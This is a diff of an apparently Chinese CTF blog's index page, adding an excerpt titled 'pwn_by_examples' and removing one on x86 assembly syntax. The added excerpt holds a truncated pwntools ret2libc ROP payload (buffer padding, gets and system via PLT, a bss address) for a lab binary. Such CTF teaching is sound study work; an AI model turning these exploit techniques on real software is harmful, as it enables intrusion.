@@ -134,6 +134,61 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/07/pwn_by_examples/">
+        <p class="h4 index-header">pwn_by_examples</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">pwn_by_examplesIDA部分shift f12 字符串
+n 重命名
+x 查看引用
+bash部分cyclic 200 #生成循环 200个
+cyclic -l xxxxx #计算偏移
+PWNTOOLS部分u64 
+asm 
+disasm from pwn import *
+sh = process(&#39;./ret2libc2&#39;)
+elf = ELF(&#39;./ret2libc2&#39;)
+rop = ROP(elf)
+
+payload = &#39;a&#39; * offset
+payload += p32(elf.plt[&#39;gets&#39;])
+payload += p32(rop.search(8).address)
+payload += p32(elf.bss() + 0x100)
+payload += p32(elf.plt[&#39;system&#39;])
+payload += p32(0)
+payload += p32(elf.bss() + 0x100)
+sh.sendline(payload)
+
+sh.sendline(&#</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-07&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/%E6%95%99%E7%A8%8B">教程</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2019/12/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
         <p class="h4 index-header">数据库复习笔记</p>
         
@@ -543,57 +598,6 @@ ESP定律的落脚点，可以看到落脚点下面一行就是一个大跳转�
             <a href="/categories/CTF">CTF</a>&nbsp;
           
             <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/02/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">
-        <p class="h4 index-header">汇编基础</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">X86汇编基础==Intel和AT&amp;T语法区别：==
-
-Intel操作数在前面，AT&amp;T的在后面
-
-
-在Intel语法中：  在AT&amp;T语法中：  有一个简单的记住它们的方法: 当你面对intel语法的时候，你可以想象把等号(=)放到2个操作数中间，当面对AT&amp;T语法的时候，你可以放一个右箭头(→）到两个操作数之间。
-
-
-AT&amp;T: 寄存器名之前需要写一个百分号(%)并且在数字前面需要加上美元符($)。并用圆括号替代方括号
-AT&amp;T: 以下是一些添加到操作符后，用来表示数据形式的后缀：– q — quad (64 bits)– l — long (32 bits)– w — word (16 bits)– b — byte (8 bits)
-
-
-重要：MOV指令在64位模式下，对低32位进行写入操作的时候，会清空高32位的内容[Int13]。比如 MOV EAX，011223344h将会把值写到RAX里，并且清空RAX的高32位区域。
-寄存器
-
-EAX： 累加器
-EBX： 基址寄存器
-ECX： 计数器
-EDX： 数据寄存器
-ESI： 源变</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-02&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a>&nbsp;
           &nbsp;
         
         
